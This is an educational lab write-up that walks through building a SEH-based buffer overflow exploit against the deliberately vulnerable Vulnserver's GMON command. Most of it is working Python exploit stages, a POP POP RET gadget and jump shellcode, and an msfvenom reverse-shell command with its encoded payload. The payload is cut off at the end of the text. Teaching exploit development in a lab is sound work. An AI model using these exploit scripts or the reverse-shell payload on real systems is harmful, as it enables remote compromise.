---
title: "Vulnserver Part 2 - GMON"
published: 2021-09-14T12:01:00-04:00
updated: 2021-09-30T12:01:00-04:00
categories:
  - writeup
tags:
  - vulnserver
  - windows
  - bufferoverflow
  - binary
  - exploit
  - bof
summary: In the second part of our Vulnserver series we encounter a SEH-based buffer overflow. SEH stands for Structured Exception Handling. The exploitation process is sligthly different... 
---

In the second part of [our Vulnserver series](/posts/vulnserver_0_overview.html) we encounter a SEH-based buffer overflow. SEH stands for **Structured Exception Handling**. The exploitation process is sligthly different, but not really much harder than the vanilla buffer overflow of [TRUN](/posts/vulnserver_1_trun.html). 


1. [Fuzzing](#fuzzing)
2. [Proof of Concept](#proof-of-concept)
3. [Not Quite the Same](#not-quite-the-same)
4. [Controlling NSEH and SEH](#controlling-nseh-and-seh)
5. [Bad Characters](#bad-characters)
6. [Pop Pop Return](#pop-pop-return)
7. [Short Jump out of NSEH](#short-jump-out-of-nseh)
8. [Long Jump to the Buffer Start](#long-jump-to-the-buffer-start)
9. [Shellcode](#shellcode)

## Fuzzing

I just re-used the fuzzer from [TRUN](/posts/vulnserver_1_trun.html#fuzzing-for-a-crash), switching out only the command. The result was pretty much the same.

```python
#!/usr/bin/env python3
# GMON - Step 0 -- Fuzzing for a crash
from boofuzz import *
import time
import sys

target_ip = "10.0.2.74"
target_port = 9999

# stop when server is dead
def is_alive(target, my_logger, session, *args, **kwargs):
    try:
        banner = target.recv(10000)

        # See if we received the standard banner
        if not banner or banner != b'Welcome to Vulnerable Server! Enter HELP for help.\n':
            raise Exception("Banner does not match")
    except:
        print("Unable to connect. Target is down. Exiting.")
        sys.exit(1)

def main():
    session = Session(
    sleep_time=1,
        target=Target(
            connection=SocketConnection(target_ip, target_port, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Host-Line"):
        s_static("GMON", name='command name')
        s_delim(" ")
        s_string("FUZZ",  name='gmon variable content')
        s_delim("\r\n")

    # the callback function gets executed after each test
    session.connect(s_get("Request"), callback=is_alive) 
    session.fuzz()

if __name__ == "__main__":
    main()
```

Once again the pattern that causes a crash appears to be: `GMON /././.` with the `/.` being repeated many times.

## Proof of Concept

Therefore the PoC is pretty much identical to the TRUN one as well:

```python
#!/usr/bin/env python3
# GMON - SEH based buffer overflow
# Step 1 - cause a crash / proof of concept
import socket

size = 4096
target_ip = "10.0.2.74"
target_port = 9999

buf = b""
buf += b"GMON /."
buf += b"A" * size
buf += b"\n"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# should get stuck here
# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

This manages to consistently crash the server in Immunity.

## Not Quite the Same

One big difference to what we experienced with TRUN will be that after the crash the EIP will not be full of A's and the ESP will not point at a stack segment that we control directly.

![Fuzzer crashes the server](/assets/img/vulnserver_gmon_10.png)

The program has been stopped because of an exception: `Access Violation when writing to [00F60000]...`

If we scroll down to the bottom of the buffer content, then we find this:

```bash
__stack__
00F5FFC8   41414141  AAAA
00F5FFCC   41414141  AAAA  Pointer to next SEH record
00F5FFD0   41414141  AAAA  SE handler
00F5FFD4   41414141  AAAA
00F5FFD8   41414141  AAAA
00F5FFDC   41414141  AAAA
00F5FFE0   41414141  AAAA
```

I've already spoilered you and told you this is a SEH-based buffer overflow, but this would be a dead giveaway.

Press `<Alt>` + `<S>` in order to open the SEH chain window:

![SEH Chain](/assets/img/vulnserver_gmon_11_seh_chain.png)

This reflects what we see on the stack.

A SEH record always consist of two 4 Byte (32 bit) addresses stored on the stack:

* NSEH - pointer to the next SEH record
* SEH - pointer to a handler procedure

If you have done some programming before, then you might recognize this as a [Linked List](https://en.wikipedia.org/wiki/Linked_list) with each SEH record being a list node.

The way this is supposed to work is that when an Exception occurs, each of these SEH records are visited in order. 

The associated SEH procedure is run and then the program moves on to the next SEH record, executes its procedure, etc. etc. until it finally reaches the last SEH record. This last SEH record will have an NSEH pointer set to `FFFFFFFF`.

Now what we see in Immunity is that we evidentally broke the first SEH record in the chain. We overwrote both NSEH and SEH pointers.

Immunity conveniently stopped the execution when it detected an Exception, this prevented the corrupt SEH pointer from being jumped to. You can let Immunity continue by pressing `<Shift>` + `<F9>`.

![SEH Chain was followed](/assets/img/vulnserver_gmon_12_seh_followed.png)

What we see now is quite similar to the TRUN crash. The program tried to jump to `41414141` (hex for AAAA) which then caused another Exception.

This means we can exploit the program in a similar fashion. First cause an exception and then use the overwritten SEH record in order to jump to some instructions of our choosing with a static address. Those instructions then get executed and hopefully the program jumps back to the buffer that we control.

The only problem is that, as mentioned above, the ESP (Stack Pointer) has been moved outside of our controlled stack space. So using a simple `JMP ESP` like we did in TRUN won't work here.


## Controlling NSEH and SEH

This part is quite similar to what we did in TRUN in order to figure out the EIP overwrite offset. 

We have to figure out the offset between the start of our buffer and the overwritten SEH record.

Create a unique byte pattern with the length of our AAAA buffer:

```bash
msf-pattern_create -l 4096
```

Plug it into our PoC:

```python
#!/usr/bin/env python3
# GMON - SEH based buffer overflow
# Step 2 - discover nseh offset
import socket

size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n"

# msf-pattern_create -l 4096
pattern = b""
pattern += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
pattern += b"d3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
pattern += b"6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
pattern += b"Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
pattern += b"n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
pattern += b"6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
pattern += b"Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"
pattern += b"x3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
pattern += b"6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"
pattern += b"Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
pattern += b"h3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"
pattern += b"6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"
pattern += b"Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"
pattern += b"r3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu"
pattern += b"6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"
pattern += b"By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C"
pattern += b"b3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce"
pattern += b"6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"
pattern += b"Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2C"
pattern += b"l3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
pattern += b"6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"
pattern += b"Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"
pattern += b"v3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy"
pattern += b"6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
pattern += b"Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"
pattern += b"f3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di"
pattern += b"6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"
pattern += b"Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D"
pattern += b"p3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds"
pattern += b"6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
pattern += b"Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2D"
pattern += b"z3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec"
pattern += b"6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9"
pattern += b"Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2E"
pattern += b"j3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em"
pattern += b"6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9"
pattern += b"Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2E"
pattern += b"t3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew"
pattern += b"6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9"
pattern += b"Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F"
pattern += b"d3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F"

buf = b""
buf += b"GMON /."
#buf += b"A" * size
buf += pattern
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

Run this script against the server.

Once the server is in the crashed state, open the SEH chain window again with `<Alt>` + `<S>`

![SEH Chain offset](/assets/img/vulnserver_gmon_20_seh_offset.png)


```bash
SEH chain of thread 00000F2C
Address    SE handler
--------   -----------------------
00DDFFCC   6F45346F
45336F45   *** CORRUPT ENTRY ***
```

```bash
msf-pattern_offset -l 4096 -q 6F45346F

[*] Exact match at offset 3553
```

Let us confirm that we control the SEH record with this offset:

```python
#!/usr/bin/env python3
# GMON - SEH based buffer overflow
# Step 3 - control nseh
import socket

offset = 3553 - 4
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n"

buf = b""
buf += b"GMON /."
buf += b"A" * offset
buf += b"B" * 4   # NSEH
buf += b"C" * 4   # SEH
buf += b"D" * (size - offset - 8)
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

![SEH Control](/assets/img/vulnserver_gmon_21_seh_control.png)

Now we control the NSEH (`BBBB`) and SEH (`CCCC`) pointers.


## Bad Characters

Before we move on we will have to figure out which byte values might break our jump addresses and shellcode.

For the TRUN buffer overflow we put the badchar test string after the EIP overwrite. Putting it after the SEH overwrite is a bit more problematic. We only have 11 * 4 Bytes available.

![Limited Space](/assets/img/vulnserver_gmon_30_badchar_problems.png)

So we have two choices:

1. Put the full test string **before** the overwrite and hope that no possible bad char might break the overflow completely
2. Split the test string into several (11 * 4 = 44 byte sized) parts and test each one individually **after** the overwrite

The first choice is the correct one since the (first) exception is not caused by overwritting the SEH record anyway. A bad char, which could break the overflow, will break it regardless of where we put it.

```python
#!/usr/bin/env python3
# GMON - SEH based buffer overflow
# Step 3 - find bad characters
import socket

offset = 3553 - 4
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a

# generate bad char test string
badchars = [ 0x00, 0x0a ] # found badchars to exclude from test
badstring = b""
for x in range(1,256):
    if(x not in badchars):
        badstring += bytes([x])

# write generated badchars to file for mona
f = open('/srv/samba/protected/badchars.bin', 'wb')
f.write(badstring)
f.close()

buf = b""
buf += b"GMON /."

buf += b"A"         # alignment (1 Byte)
buf += badstring    # bad char test string
buf += b"A" * (offset - len(badstring) - 1 )

buf += b"B" * 4         # NSEH
buf += b"C" * 4         # SEHandler
buf += b"D" * (size - offset - 8)
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

Please note that I added one `A` (`0x41`) byte before the badchar test string since the byte string `GMON /.` is only 7 bytes long. This will align the start of the test string properly.

![Bad char test](/assets/img/vulnserver_gmon_31_badchar_test.png)

The buffer overflow still works, so we do not have any overflow breaking bad chars. Let us see if we find any other bad chars:

```bash
# start of badchar test string on stack
__stack__
0104F1F0   04030201
```

```bash
!mona compare -f Y:\badchars.bin -t raw -a 0104F1F0
```

![Test string is unmodified](/assets/img/vulnserver_gmon_32_badchar_clear.png)

Looks like we are in the clear. Mona reports the badchar test string is unmodified on the stack.


## Pop Pop Return

As I mentioned above a `JMP ESP` on its own won't work here because the ESP does not point at any part of the stack that we control directly.

The question then naturally arises: Can't we just move the ESP?

The most obvious way would simply adding or subtracting a value from the address stored in the ESP until it points at our controlled stack space. 

But so far the only control we have over the program is the abiltiy to perform a jump to some valid address. In other words we can only jump to some existing segment of instructions that has been loaded into memory and has a static address. 

Before we try to look for a fitting gadget, let us take a look again where the ESP ends up at after passing the first exception with `<Shift>` + `<F9>`

![SEHandler](/assets/img/vulnserver_gmon_40_seh_handler.png)

If you look at the Stack window, then it appears that the ESP points at some sort of exception handler. And only two steps below it is the address of our overwritten NSEH (We put BBBB there).

If we could move the ESP by only two steps (ESP + 4 + 4), then it would point at that address of our NSEH entry. A part of the stack that we have direct control over.

Then we could load that address into some register and jump to it, or even better, we could use a return instruction.

A return `RET` instruction works similar to a `JMP ESP`, but it does not jump directly to the value of the ESP. Rather it looks where the ESP points at and then uses that value for the jump.

The `RET` instruction can also be imagined as a `POP EIP`. The four bytes stored at the location where the `ESP` points at is popped into the instruction pointer register.

Now, how do we move the ESP by those two steps?

There are two basic stack operations:

**PUSH** (add) a value onto the top of the stack and move the stack pointer one position forward to match the new entry. Forward in this case means a 4 byte lower memory address. (ESP = ESP - 4)

```bash
PUSH <source register/value>
```

**POP** (read and remove) a value from the top of the stack into a register. And move the stack pointer one position back to match the entry before the read/removed one. In this case this means a 4 byte higher memory address (ESP = ESP + 4).
```bash
POP <target register>
```

Each of these two instructions will move the ESP (stack pointer), since the main purpose of the stack pointer is to keep track of the top of the stack. It can be a bit confusing that a PUSH would result in a lower ESP, but in x86 the stack grows from a high address towards a low address (grows downwards numerically). But in our debugger stack view it grows upwards.

So a POP will move the ESP to a 4 Byte higher address (ESP = ESP + 4).

If we can do two POP's and a RET, then we are golden.

The target register for the POP instruction does not really matter to us. We are only interested in the indirect effect of moving the stack pointer (ESP).

Since this is a very commonly used gadget, mona can find some PPR gadgets for us:

```bash
!mona seh
```

![Mona finds PPR candidates](/assets/img/vulnserver_gmon_50_mona_ppr.png)

Important here is that SafeSEH should preferably be `False` and the address should not contain any of our found bad chars.

The first address in the list fits these requirements:

```bash
0x625010b4 : 

  pop ebx 
  pop ebp 
  ret  

|  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
```

Let us test if it works:

```python
#!/usr/bin/env python3
# GMON - SEH based buffer overflow
# Step 4 - POP POP RET
import socket
import struct

offset = 3553 - 4
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a

badchars = [ 0x00, 0x0a ] # found badchars

ppr_address = 0x625010b4    # address of POP POP RET gadget
ppr_gadget = struct.pack("<I", ppr_address)

buf = b""
buf += b"GMON /."
buf += b"A" * offset

buf += b"B" * 4          # NSEH: this will get executed as instructions
buf += ppr_gadget        # SEH address -> POP POP RET

buf += b"D" * (size - offset - 8)
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

Before you run this make sure to set a breakpoint on `625010b4` so we can see whether the jump back to our NSEH overwrite works.

Use `<Shift>` + `<F9>` in order to pass the exception and then you should hit the breakpoint. Skip forward with `F7` to confirm that we bounce back to our controlled stack space.


![PPR Breakpoint](/assets/img/vulnserver_gmon_51_mona_ppr.png)

After running through the POP POP RET the EIP (Instruction Pointer) will point at our NSEH (`BBBB`):

![After PPR](/assets/img/vulnserver_gmon_52_after_ppr.png)

That appears to have worked.


## Short Jump out of NSEH

Now we have code execution. Kind of. 

We are limited to the four bytes of the overwritten NSEH. After executing the four bytes of the NSEH, the EIP will hit our PPR jump address and presumably cause another exception.

In order to prevent that from happening we will have to perform a jump.

There are three different jump types in x86: **long**, **short** and **near** jump

A long jump won't fit in our 4 bytes, being 5 bytes long:
 
```bash
$ msf-nasm_shell
 nasm > 
 nasm > jmp -8
 00000000  E9F3FFFFFF        jmp 0xfffffff8
```
A short jump fits though. It is only two bytes long:

```bash
 nasm > jmp $-16
 00000000  EBEE              jmp short 0xfffffff0
```

Due to the limited range of a short jump we can only jump -126 bytes backwards. But we can just jump back a few bytes and from there perform a long jump.

So let us jump back 16 bytes. That should be more than enough space for a long jump.

```python
#!/usr/bin/env python3
# GMON - SEH based buffer overflow
# Step 5a - Short Jump out of NSEH
import socket
import struct

offset = 3549
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a
badchars = [ 0x00, 0x0a ] # found badchars
NOP = b"\x90"

ppr_address = 0x625010b4
ppr_gadget = struct.pack("<I", ppr_address)

buf = b""
buf += b"GMON /."
buf += b"A" * (offset - 16)

# Short jump should end up here
buf += b"C" * 16

# Step 1 -- NSEH Overwrite -- short jump
# jump back 16 bytes
# nasm>  jmp $-16
buf += b"\xEB\xEE" + NOP + NOP

# Step 0 -- SEH Overwrite -- jump to pop pop return
buf += ppr_gadget

buf += b"D" * (size - offset - 8)
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

Make sure to set the breakpoint again on the PPR address before you run this.

![Short Jump](/assets/img/vulnserver_gmon_60_small_jump.png)

We should end up in the new 16 C's that we added as placeholder.


## Long Jump to the Buffer Start

The NSEH offset was 3549 bytes from the start of the buffer.

```bash
3549 - 16 = 3533
```

```bash
 nasm > jmp -3533
 00000000  E92EF2FFFF        jmp 0xfffff233
```

```python
#!/usr/bin/env python3
# GMON - SEH based buffer overflow
# Step 5b - Long jump to the start of the buffer
import socket
import struct

offset = 3549
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a
badchars = [ 0x00, 0x0a ] # found badchars
NOP = b"\x90"

ppr_address = 0x625010b4
ppr_gadget = struct.pack("<I", ppr_address)

buf = b""
buf += b"GMON /."
buf += b"A" * (offset - 16)

# Step 2 -- long jump
# jump back 3533 bytes to the start of the AAAA
# nasm>  jmp -3533
buf += b"\xE9\x2E\xF2\xFF\xFF"  # step 2:   jmp -3533
buf += NOP * 11

# Step 1 -- NSEH Overwrite -- short jump
# jump back 16 bytes
# nasm>  jmp $-16
buf += b"\xEB\xEE" + NOP + NOP 

# Step 0 -- SEH Overwrite -- jump to pop pop return
buf += ppr_gadget

buf += b"D" * (size - offset - 8)
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

![Long Jump](/assets/img/vulnserver_gmon_61_long_jump.png)

We end up at the first A.


## Shellcode

Now that we have carved out enough space we can upload some shellcode. You can pop calc again like we did in TRUN, but I am skipping this step here and go straight for the reverse shell.


Generate a reverse shell with msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.79 LPORT=53 -f py -v payload -e x86/shikata_ga_nai -b '\x00\x0A' EXITFUNC=seh
```

Please note that we use `EXITFUNC=seh` instead of `thread` this time.

```python
#!/usr/bin/env python3
# GMON - SEH based buffer overflow
# Step 6 - Exploit
import socket
import struct

offset = 3549
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a
badchars = [ 0x00, 0x0a ] # found badchars
NOP = b"\x90"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.79 LPORT=53 -f py -v payload -e x86/shikata_ga_nai -b '\x00\x0A' EXITFUNC=seh
payload =  b""
payload += b"\xbd\xc6\xb8\x8f\xc1\xdb\xd2\xd9\x74\x24\xf4\x5a"
payload += b"\x29\xc9\xb1\x52\x31\x6a\x12\x03\x6a\x12\x83\x2c"
payload += b"\x44\x6d\x34\x4c\x5d\xf0\xb7\xac\x9e\x95\x3e\x49"
payload += b"\xaf\x95\x25\x1a\x80\x25\x2d\x4e\x2d\xcd\x63\x7a"
payload += b"\xa6\xa3\xab\x8d\x0f\x09\x8a\xa0\x90\x22\xee\xa3"
payload += b"\x12\x39\x23\x03\x2a\xf2\x36\x42\x6b\xef\xbb\x16"
payload += b"\x24\x7b\x69\x86\x41\x31\xb2\x2d\x19\xd7\xb2\xd2"
payload += b"\xea\xd6\x93\x45\x60\x81\x33\x64\xa5\xb9\x7d\x7e"
payload += b"\xaa\x84\x34\xf5\x18\x72\xc7\xdf\x50\x7b\x64\x1e"
payload += b"\x5d\x8e\x74\x67\x5a\x71\x03\x91\x98\x0c\x14\x66"
payload += b"\xe2\xca\x91\x7c\x44\x98\x02\x58\x74\x4d\xd4\x2b"
payload += b"\x7a\x3a\x92\x73\x9f\xbd\x77\x08\x9b\x36\x76\xde"
payload += b"\x2d\x0c\x5d\xfa\x76\xd6\xfc\x5b\xd3\xb9\x01\xbb"
payload += b"\xbc\x66\xa4\xb0\x51\x72\xd5\x9b\x3d\xb7\xd4\x23"
payload += b"\xbe\xdf\x6f\x50\x8c\x40\xc4\xfe\xbc\x09\xc2\xf9"
payload += b"\xc3\x23\xb2\x95\x3d\xcc\xc3\xbc\xf9\x98\x93\xd6"
payload += b"\x28\xa1\x7f\x26\xd4\x74\x2f\x76\x7a\x27\x90\x26"
